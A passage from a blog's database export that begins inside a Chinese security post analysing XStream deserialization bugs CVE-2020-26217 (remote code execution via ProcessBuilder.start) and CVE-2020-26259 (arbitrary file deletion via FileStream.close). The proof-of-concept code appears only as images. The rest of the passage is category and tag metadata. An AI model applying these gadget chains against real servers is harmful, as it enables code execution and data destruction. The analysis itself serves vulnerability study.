alt=\"07cb916ddd1ecccab1826e6d02e2332a.png\"></p>\n<p>可见在javax.imageio.ImageIO$ContainsFilter类的filter方法中，执行了method.invoke(elt)。method可以通过xml中javax.imageio.ImageIO$ContainsFilter元素包含的method元素控制，见poc</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102043-4ad23f94-43fc-1.png\" alt=\"3b7db9c50a524053543af100954a2725.png\"></p>\n<p>此时method为ProcessBuilder类的start方法，而通过上文可知：elt为构造好的java.lang.ProcessBuilder对象。在method与elt都可控的情况下，进行反射调用即可实现远程代码执行利用。</p>\n<p>我们接下来看看CVE-2020-26259任意文件删除漏洞</p>\n<h2 id=\"CVE-2020-26259\"><a href=\"#CVE-2020-26259\" class=\"headerlink\" title=\"CVE-2020-26259\"></a>CVE-2020-26259</h2><p>首先分析下CVE-2020-26259的poc</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102054-516f3942-43fc-1.png\" alt=\"9487c50fd32f234881fa16a9ce39323f.png\"></p>\n<p>从poc中可以发现：CVE-2020-26259的poc中is元素为com.sun.xml.internal.ws.util.ReadAllStream$FileStream，这与上一个漏洞poc不一样。</p>\n<p>值得注意的是，这次漏洞利用的不是Base64Data中get方法里的baos.readFrom(is)这个入口，而是位于它下面一行的is.close()这行代码。通过调试，程序在执行过get方法中baos.readFrom(is)后，紧接着执行is.Close()，见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102102-56a91cca-43fc-1.png\" alt=\"c40109bfe416f80101dd1aa35c11b9c4.png\"></p>\n<p>此时的is是com.sun.xml.internal.ws.util.ReadAllStream$FileStream，跟入com.sun.xml.internal.ws.util.ReadAllStream$FileStream中的close方法，见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102111-5c093aec-43fc-1.png\" alt=\"d783f17d2981353ed8d3e6b5d0375d6c.png\"></p>\n<p>当com.sun.xml.internal.ws.util.ReadAllStream$FileStream对象的tempFile属性值不为空时，删除tempFile文件。</p>\n<p>tempFile是com.sun.xml.internal.ws.util.ReadAllStream$FileStream对象的属性值，因此可以直接在poc中com.sun.xml.internal.ws.util.ReadAllStream$FileStream元素内构造tempFile属性元素，通过tempFile属性元素控制要删除的文件，见下图poc</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201222102121-61805992-43fc-1.png\" alt=\"53b7006a07a7e5b96da67628c16cc974.png\"></p>\n<p>到此，一个任意文件删除漏洞产生了</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>通过对这两个漏洞的分析不难发现，CVE-2020-26259其实是CVE-2020-26217的一个思路上的延伸：在is可控时，既然baos.readFrom(is)可以利用，那么is.close()是否也能构造出一个利用链呢？从CVE-2020-26259答案上来看是可以的。</p>\n<p>从CVE-2020-26259也可以延伸出另一个问题：只要找到一个类，其中存在close方法且close方法中有可利用的地方，那么一条新的利用链就被挖掘出来了。</p>\n"}],"PostAsset":[{"_id":"source/_posts/Hello-World-0/helloworld.jpeg","slug":"helloworld.jpeg","post":"ckgrozu8e000owsa90ynhfvm8","modified":0,"renderable":0},{"_id":"source/_posts/Webmin-RCE/1.jpg","slug":"1.jpg","post":"ckgrozu8r001kwsa9dp27b1d0","modified":0,"renderable":0},{"_id":"source/_posts/diango/0.jpg","slug":"0.jpg","post":"ckgrozu97002xwsa982y438i7","modified":0,"renderable":0},{"_id":"source/_posts/diango/1.jpg","slug":"1.jpg","post":"ckgrozu97002xwsa982y438i7","modified":0,"renderable":0},{"_id":"source/_posts/diango/2.jpg","slug":"2.jpg","post":"ckgrozu97002xwsa982y438i7","modified":0,"renderable":0},{"_id":"source/_posts/diango/3.jpg","slug":"3.jpg","post":"ckgrozu97002xwsa982y438i7","modified":0,"renderable":0},{"_id":"source/_posts/diango/4.jpg","slug":"4.jpg","post":"ckgrozu97002xwsa982y438i7","modified":0,"renderable":0},{"_id":"source/_posts/diango/5.jpg","slug":"5.jpg","post":"ckgrozu97002xwsa982y438i7","modified":0,"renderable":0},{"_id":"source/_posts/diango/6.jpg","slug":"6.jpg","post":"ckgrozu97002xwsa982y438i7","modified":0,"renderable":0},{"_id":"source/_posts/hexohelp/0.jpeg","slug":"0.jpeg","post":"ckgrozu9k003swsa971zzg32u","modified":0,"renderable":0},{"_id":"source/_posts/hexohelp/1.png","slug":"1.png","post":"ckgrozu9k003swsa971zzg32u","modified":0,"renderable":0},{"_id":"source/_posts/hexohelp/2.png","slug":"2.png","post":"ckgrozu9k003swsa971zzg32u","modified":0,"renderable":0},{"_id":"source/_posts/hexohelp/3.png","slug":"3.png","post":"ckgrozu9k003swsa971zzg32u","modified":0,"renderable":0},{"_id":"source/_posts/kris/0.jpg","slug":"0.jpg","post":"ckgrozu9m003zwsa9hogq9i5l","modified":0,"renderable":0},{"_id":"source/_posts/kris/1.jpg","slug":"1.jpg","post":"ckgrozu9m003zwsa9hogq9i5l","modified":0,"renderable":0},{"_id":"source/_posts/kris/10.jpg","slug":"10.jpg","post":"ckgrozu9m003zwsa9hogq9i5l","modified":0,"renderable":0},{"_id":"source/_posts/kris/11.jpg","slug":"11.jpg","post":"ckgrozu9m003zwsa9hogq9i5l","modified":0,"renderable":0},{"_id":"source/_posts/kris/2.jpg","slug":"2.jpg","post":"ckgrozu9m003zwsa9hogq9i5l","modified":0,"renderable":0},{"_id":"source/_posts/kris/3.jpg","slug":"3.jpg","post":"ckgrozu9m003zwsa9hogq9i5l","modified":0,"renderable":0},{"_id":"source/_posts/kris/4.jpg","slug":"4.jpg","post":"ckgrozu9m003zwsa9hogq9i5l","modified":0,"renderable":0},{"_id":"source/_posts/kris/5.jpg","slug":"5.jpg","post":"ckgrozu9m003zwsa9hogq9i5l","modified":0,"renderable":0},{"_id":"source/_posts/kris/6.jpg","slug":"6.jpg","post":"ckgrozu9m003zwsa9hogq9i5l","modified":0,"renderable":0},{"_id":"source/_posts/kris/7.jpg","slug":"7.jpg","post":"ckgrozu9m003zwsa9hogq9i5l","modified":0,"renderable":0},{"_id":"source/_posts/kris/8.jpg","slug":"8.jpg","post":"ckgrozu9m003zwsa9hogq9i5l","modified":0,"renderable":0},{"_id":"source/_posts/kris/9.jpg","slug":"9.jpg","post":"ckgrozu9m003zwsa9hogq9i5l","modified":0,"renderable":0},{"_id":"source/_posts/ukiyoe/0.jpg","slug":"0.jpg","post":"ckgrozua40054wsa99jkt2l31","modified":0,"renderable":0},{"_id":"source/_posts/ukiyoe/1.jpeg","slug":"1.jpeg","post":"ckgrozua40054wsa99jkt2l31","modified":0,"renderable":0},{"_id":"source/_posts/ukiyoe/2.jpg","slug":"2.jpg","post":"ckgrozua40054wsa99jkt2l31","modified":0,"renderable":0},{"_id":"source/_posts/ukiyoe/3.jpeg","slug":"3.jpeg","post":"ckgrozua40054wsa99jkt2l31","modified":0,"renderable":0},{"_id":"source/_posts/ukiyoe/4.jpg","slug":"4.jpg","post":"ckgrozua40054wsa99jkt2l31","modified":0,"renderable":0}],"PostCategory":[{"post_id":"ckgrozu830009wsa9fifzctm8","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8a000kwsa939zab3de"},{"post_id":"ckgrozu7l0001wsa93tzb7ixp","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8f000pwsa96jtt5sld"},{"post_id":"ckgrozu85000bwsa9h87e2e0h","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8g000swsa96yg08qs6"},{"post_id":"ckgrozu87000gwsa9eb8q6shv","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8i000wwsa91pqhbiv0"},{"post_id":"ckgrozu7t0003wsa93saxdgni","category_id":"ckgrozu85000cwsa9cbviat5s","_id":"ckgrozu8j000zwsa97t2k5n56"},{"post_id":"ckgrozu8a000jwsa972cn6jg5","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8m0013wsa91nqqcvf7"},{"post_id":"ckgrozu8e000owsa90ynhfvm8","category_id":"ckgrozu85000cwsa9cbviat5s","_id":"ckgrozu8n0016wsa9bmkl3wjw"},{"post_id":"ckgrozu820007wsa9d3ubgi2r","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8o0019wsa97u840tjv"},{"post_id":"ckgrozu8g000rwsa9dxt55jsd","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8p001cwsa98u7a34ov"},{"post_id":"ckgrozu8i000vwsa9dyx0g8pg","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8q001fwsa9b1ka5z18"},{"post_id":"ckgrozu8i000ywsa9h5ul8gih","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8r001iwsa9cy4tc0f8"},{"post_id":"ckgrozu8k0012wsa9gr6yc9np","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8s001lwsa9452g93rc"},{"post_id":"ckgrozu8m0015wsa9e7vn392q","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8t001owsa947af1z0d"},{"post_id":"ckgrozu8n0018wsa930gsd5lk","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8t001rwsa9g07he44w"},{"post_id":"ckgrozu8o001bwsa91b3167a6","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8u001uwsa9blf73uxq"},{"post_id":"ckgrozu8p001ewsa97sv65njp","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8v001ywsa9b61r0a7x"},{"post_id":"ckgrozu8q001hwsa90pib3nrr","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8w0021wsa99f5xhqwc"},{"post_id":"ckgrozu8r001kwsa9dp27b1d0","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8x0024wsa9g67y1jd0"},{"post_id":"ckgrozu8s001nwsa9dzw9h2bj","category_id":"ckgrozu85000cwsa9cbviat5s","_id":"ckgrozu8y0027wsa98hha7ne0"},{"post_id":"ckgrozu8t001qwsa9egl6gp9z","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8z002awsa9cyfpcrzw"},{"post_id":"ckgrozu8u001twsa98zaigyqw","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu8z002dwsa97hop0qty"},{"post_id":"ckgrozu8v001xwsa920bpbdf3","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu90002gwsa9fpf1h5fm"},{"post_id":"ckgrozu8v0020wsa98qq0gzgm","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu92002jwsa96n714mt0"},{"post_id":"ckgrozu8w0023wsa9gsfl9ilu","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu93002mwsa9de4f4uls"},{"post_id":"ckgrozu8x0026wsa904av135n","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu94002pwsa947pi90ob"},{"post_id":"ckgrozu8y0029wsa91nkqh1c5","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu96002swsa9enpz1e4o"},{"post_id":"ckgrozu8z002cwsa96fqs36o9","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu97002vwsa92mn12f9r"},{"post_id":"ckgrozu91002iwsa98xi6b2an","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu97002ywsa92wru92zh"},{"post_id":"ckgrozu93002lwsa9f9q58luh","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu990031wsa9dqoc9mr4"},{"post_id":"ckgrozu94002owsa955qz7swm","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu990034wsa97lqr1w5s"},{"post_id":"ckgrozu94002rwsa92jz48hyr","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu9a0037wsa96uzj7spk"},{"post_id":"ckgrozu96002uwsa99z9b5sa9","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu9b003awsa9czq35urm"},{"post_id":"ckgrozu97002xwsa982y438i7","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu9c003dwsa9322lf4zy"},{"post_id":"ckgrozu980030wsa97spmhmgc","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu9d003gwsa99z0dccs6"},{"post_id":"ckgrozu990033wsa9gqdi0fsh","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu9e003jwsa93cmqdh4g"},{"post_id":"ckgrozu9b0039wsa9cuhr6jen","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu9j003nwsa9brzbce5n"},{"post_id":"ckgrozu9c003cwsa9cx6k7vvc","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu9k003qwsa98jlf8b3e"},{"post_id":"ckgrozu9d003fwsa9d49lem8t","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu9l003twsa959qlhfqj"},{"post_id":"ckgrozu9d003iwsa9a76n4pxf","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu9m003wwsa97xmb08qt"},{"post_id":"ckgrozu9i003mwsa91nhk648h","category_id":"ckgrozu85000cwsa9cbviat5s","_id":"ckgrozu9o0040wsa9bh1gajnk"},{"post_id":"ckgrozu9j003pwsa92gh96cpm","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu9q0043wsa9bjvz9flt"},{"post_id":"ckgrozu9k003swsa971zzg32u","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu9t0046wsa962s7bv95"},{"post_id":"ckgrozu9l003vwsa9c23t1lce","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu9u0049wsa93yl9f6ak"},{"post_id":"ckgrozu9m003zwsa9hogq9i5l","category_id":"ckgrozu85000cwsa9cbviat5s","_id":"ckgrozu9u004cwsa9eqhzd8im"},{"post_id":"ckgrozu9q0045wsa9a6o85my3","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu9v004fwsa902ws632c"},{"post_id":"ckgrozu9t0048wsa97qtz942b","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu9x004iwsa92dojearo"},{"post_id":"ckgrozu9v004ewsa97bz90wkw","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozu9y004nwsa92waogh1i"},{"post_id":"ckgrozu9w004hwsa9fuqe562g","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozua1004qwsa9gztd2tuv"},{"post_id":"ckgrozu9x004kwsa942sd28jk","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozua2004twsa9b664e1q6"},{"post_id":"ckgrozu9y004mwsa96xolaxsb","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozua3004wwsa9cbrp0pew"},{"post_id":"ckgrozua0004pwsa988o86wg1","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozua3004zwsa9ddvzf6il"},{"post_id":"ckgrozua1004swsa9354s1jhp","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozua40052wsa9d8vgbqme"},{"post_id":"ckgrozua2004vwsa9eozq3e9g","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozua50055wsa90e5k5tlt"},{"post_id":"ckgrozua3004ywsa9120jbvmz","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozua50058wsa96df1cf0u"},{"post_id":"ckgrozua40051wsa97c93djwz","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozua6005bwsa9eaoddl3l"},{"post_id":"ckgrozua40054wsa99jkt2l31","category_id":"ckgrozu85000cwsa9cbviat5s","_id":"ckgrozua7005ewsa9bhl3ar41"},{"post_id":"ckgrozua50057wsa93lga3g11","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozua8005hwsa9go9qf2q9"},{"post_id":"ckgrozua6005awsa9gwq0d284","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozua8005kwsa957m82yll"},{"post_id":"ckgrozua6005dwsa9gng71cy6","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozua9005nwsa9edjo15ki"},{"post_id":"ckgrozua7005gwsa99xru6ubj","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozuaa005qwsa93i2q1y81"},{"post_id":"ckgrozua8005jwsa95ximfs5u","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozuaa005twsa99luka4sd"},{"post_id":"ckgrozua9005mwsa9ee89bcma","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozuab005vwsa9h1prf20c"},{"post_id":"ckgrozua9005pwsa92hxxbgeh","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozuab005xwsa99mcaapvy"},{"post_id":"ckgrozuaa005swsa9a6bm4bi9","category_id":"ckgrozu85000cwsa9cbviat5s","_id":"ckgrozuab005zwsa97w624hsm"},{"post_id":"ckgrozuai0069wsa96mdwdqgn","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozual006gwsa98x1957v9"},{"post_id":"ckgrozuai006awsa9c6l38sr7","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozual006jwsa9ck96avuk"},{"post_id":"ckgrozuaj006cwsa9hu383w8w","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozuam006mwsa99gsf5cx4"},{"post_id":"ckgrozuak006fwsa94lzl1m4k","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozuam006owsa93499g67t"},{"post_id":"ckgrozual006iwsa9627q0p8l","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozuan006qwsa9f79yg1ap"},{"post_id":"ckgrozuam006lwsa99qir9cj9","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgrozuan006swsa94jdoc89p"},{"post_id":"ckgw22dqk0000eca99cub1zmh","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckgw22dqv0002eca99d9uhgwa"},{"post_id":"ckh0bgtro0000z4a91rcphbgx","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckh0bgts00002z4a9ekuyf38j"},{"post_id":"cki8h7236000014a967qq71k4","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"cki8h723j000214a9etnw8v6l"},{"post_id":"ckizdlr2f000034a93yuwcez8","category_id":"ckgrozu7x0004wsa930t55zcw","_id":"ckizdlr2r000234a9hcgh8sgb"}],"PostTag":[{"post_id":"ckgrozu830009wsa9fifzctm8","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu87000ewsa92h3644it"},{"post_id":"ckgrozu7l0001wsa93tzb7ixp","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu88000hwsa9bf2xfnb1"},{"post_id":"ckgrozu85000bwsa9h87e2e0h","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu8e000nwsa9fsbk9wvp"},{"post_id":"ckgrozu87000gwsa9eb8q6shv","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu8f000qwsa9hu2k7esz"},{"post_id":"ckgrozu7t0003wsa93saxdgni","tag_id":"ckgrozu86000dwsa975is5ivr","_id":"ckgrozu8i000uwsa9h15n2jxs"},{"post_id":"ckgrozu8e000owsa90ynhfvm8","tag_id":"ckgrozu86000dwsa975is5ivr","_id":"ckgrozu8i000xwsa9663b61k8"},{"post_id":"ckgrozu820007wsa9d3ubgi2r","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu8k0011wsa9en0mar84"},{"post_id":"ckgrozu8g000rwsa9dxt55jsd","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu8m0014wsa99am2ehpe"},{"post_id":"ckgrozu8a000jwsa972cn6jg5","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu8n0017wsa9eyq8du08"},{"post_id":"ckgrozu8a000jwsa972cn6jg5","tag_id":"ckgrozu8g000twsa9ekg70xk6","_id":"ckgrozu8o001awsa94i864g71"},{"post_id":"ckgrozu8i000ywsa9h5ul8gih","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu8p001dwsa91g209f7l"},{"post_id":"ckgrozu8k0012wsa9gr6yc9np","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu8q001gwsa9alyc4nof"},{"post_id":"ckgrozu8m0015wsa9e7vn392q","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu8r001jwsa9fpkl0p9r"},{"post_id":"ckgrozu8i000vwsa9dyx0g8pg","tag_id":"ckgrozu8j0010wsa949ze45ws","_id":"ckgrozu8s001mwsa9c8j973va"},{"post_id":"ckgrozu8n0018wsa930gsd5lk","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu8t001pwsa9cymif9ce"},{"post_id":"ckgrozu8o001bwsa91b3167a6","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu8u001swsa90hifcaft"},{"post_id":"ckgrozu8p001ewsa97sv65njp","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu8v001wwsa99il27ltf"},{"post_id":"ckgrozu8q001hwsa90pib3nrr","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu8v001zwsa9bhcg9o4m"},{"post_id":"ckgrozu8r001kwsa9dp27b1d0","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu8w0022wsa9ckgybttz"},{"post_id":"ckgrozu8s001nwsa9dzw9h2bj","tag_id":"ckgrozu86000dwsa975is5ivr","_id":"ckgrozu8x0025wsa9apw9ei7o"},{"post_id":"ckgrozu8u001twsa98zaigyqw","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu8y0028wsa97tltfmjj"},{"post_id":"ckgrozu8v001xwsa920bpbdf3","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu8z002bwsa9g0gv4z2d"},{"post_id":"ckgrozu8v0020wsa98qq0gzgm","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu90002ewsa91myiagip"},{"post_id":"ckgrozu8t001qwsa9egl6gp9z","tag_id":"ckgrozu8u001vwsa94b9wc9do","_id":"ckgrozu91002hwsa94xag35kz"},{"post_id":"ckgrozu8w0023wsa9gsfl9ilu","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu92002kwsa907hgb314"},{"post_id":"ckgrozu8x0026wsa904av135n","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu93002nwsa97xj0hjts"},{"post_id":"ckgrozu8y0029wsa91nkqh1c5","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu94002qwsa9ge6e2xu8"},{"post_id":"ckgrozu8z002cwsa96fqs36o9","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu96002twsa912bp82jw"},{"post_id":"ckgrozu90002fwsa94inu1f7i","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu97002wwsa9dh2m52so"},{"post_id":"ckgrozu91002iwsa98xi6b2an","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu98002zwsa9fu65hl4a"},{"post_id":"ckgrozu93002lwsa9f9q58luh","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu990032wsa996kk03ev"},{"post_id":"ckgrozu94002owsa955qz7swm","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu9a0035wsa9aazp194k"},{"post_id":"ckgrozu94002rwsa92jz48hyr","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu9b0038wsa92m415win"},{"post_id":"ckgrozu96002uwsa99z9b5sa9","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu9b003bwsa942u5dpgg"},{"post_id":"ckgrozu97002xwsa982y438i7","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu9d003ewsa9405k0o94"},{"post_id":"ckgrozu980030wsa97spmhmgc","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu9d003hwsa99ray1xi9"},{"post_id":"ckgrozu990033wsa9gqdi0fsh","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu9i003lwsa9f02o6kix"},{"post_id":"ckgrozu9a0036wsa98efkbcwf","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu9j003owsa95urdakep"},{"post_id":"ckgrozu9b0039wsa9cuhr6jen","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu9k003rwsa98npb3f8h"},{"post_id":"ckgrozu9c003cwsa9cx6k7vvc","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu9l003uwsa9am6z7uf3"},{"post_id":"ckgrozu9d003iwsa9a76n4pxf","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu9m003ywsa9efzv33vr"},{"post_id":"ckgrozu9i003mwsa91nhk648h","tag_id":"ckgrozu86000dwsa975is5ivr","_id":"ckgrozu9p0041wsa9fp4k8waz"},{"post_id":"ckgrozu9j003pwsa92gh96cpm","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu9q0044wsa91v0r338h"},{"post_id":"ckgrozu9d003fwsa9d49lem8t","tag_id":"ckgrozu9f003kwsa9ft7mbmtn","_id":"ckgrozu9t0047wsa95wl31itu"},{"post_id":"ckgrozu9l003vwsa9c23t1lce","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu9u004awsa998253o76"},{"post_id":"ckgrozu9m003zwsa9hogq9i5l","tag_id":"ckgrozu86000dwsa975is5ivr","_id":"ckgrozu9v004dwsa91dw4669t"},{"post_id":"ckgrozu9p0042wsa9ao5o3eev","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu9v004gwsa928lcdi4h"},{"post_id":"ckgrozu9k003swsa971zzg32u","tag_id":"ckgrozu9m003xwsa9532gbvx9","_id":"ckgrozu9x004jwsa9ef2xdzbn"},{"post_id":"ckgrozu9q0045wsa9a6o85my3","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu9y004lwsa973er40os"},{"post_id":"ckgrozu9t0048wsa97qtz942b","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozu9z004owsa94zzz8z9b"},{"post_id":"ckgrozu9t0048wsa97qtz942b","tag_id":"ckgrozu8g000twsa9ekg70xk6","_id":"ckgrozua1004rwsa9husegr4e"},{"post_id":"ckgrozu9u004bwsa9256bcp4t","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozua2004uwsa90zfaegxz"},{"post_id":"ckgrozu9v004ewsa97bz90wkw","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozua3004xwsa9hbhb30i9"},{"post_id":"ckgrozu9v004ewsa97bz90wkw","tag_id":"ckgrozu8g000twsa9ekg70xk6","_id":"ckgrozua40050wsa94rbwdxwi"},{"post_id":"ckgrozu9w004hwsa9fuqe562g","tag_id":"ckgrozu8u001vwsa94b9wc9do","_id":"ckgrozua40053wsa9ex4561nk"},{"post_id":"ckgrozu9x004kwsa942sd28jk","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozua50056wsa97edi000x"},{"post_id":"ckgrozu9x004kwsa942sd28jk","tag_id":"ckgrozu8g000twsa9ekg70xk6","_id":"ckgrozua60059wsa9bynx2986"},{"post_id":"ckgrozu9y004mwsa96xolaxsb","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozua6005cwsa9dvz15ftg"},{"post_id":"ckgrozu9y004mwsa96xolaxsb","tag_id":"ckgrozu8g000twsa9ekg70xk6","_id":"ckgrozua7005fwsa95eve8u2w"},{"post_id":"ckgrozua0004pwsa988o86wg1","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozua8005iwsa98wuugsgw"},{"post_id":"ckgrozua0004pwsa988o86wg1","tag_id":"ckgrozu8g000twsa9ekg70xk6","_id":"ckgrozua8005lwsa97hki3rm7"},{"post_id":"ckgrozua1004swsa9354s1jhp","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozua9005owsa93vapa6w3"},{"post_id":"ckgrozua1004swsa9354s1jhp","tag_id":"ckgrozu8g000twsa9ekg70xk6","_id":"ckgrozuaa005rwsa932ewe2z3"},{"post_id":"ckgrozua2004vwsa9eozq3e9g","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozuab005uwsa91sno9qpp"},{"post_id":"ckgrozua3004ywsa9120jbvmz","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozuab005wwsa9008x5gie"},{"post_id":"ckgrozua40051wsa97c93djwz","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozuab005ywsa9d3tn6fhe"},{"post_id":"ckgrozua40054wsa99jkt2l31","tag_id":"ckgrozu86000dwsa975is5ivr","_id":"ckgrozuab0060wsa9btuyay05"},{"post_id":"ckgrozua50057wsa93lga3g11","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozuab0061wsa97jyy39qd"},{"post_id":"ckgrozua6005awsa9gwq0d284","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozuab0062wsa9bhw211uh"},{"post_id":"ckgrozua6005dwsa9gng71cy6","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozuab0063wsa94wze4ned"},{"post_id":"ckgrozua7005gwsa99xru6ubj","tag_id":"ckgrozu800005wsa9fs26aqqk","_id":"ckgrozuac0064wsa9aseb7qn1"},{"post_id":"ckgrozua8005jwsa95ximfs5u","tag_id":"ckgrozu800005wsa9f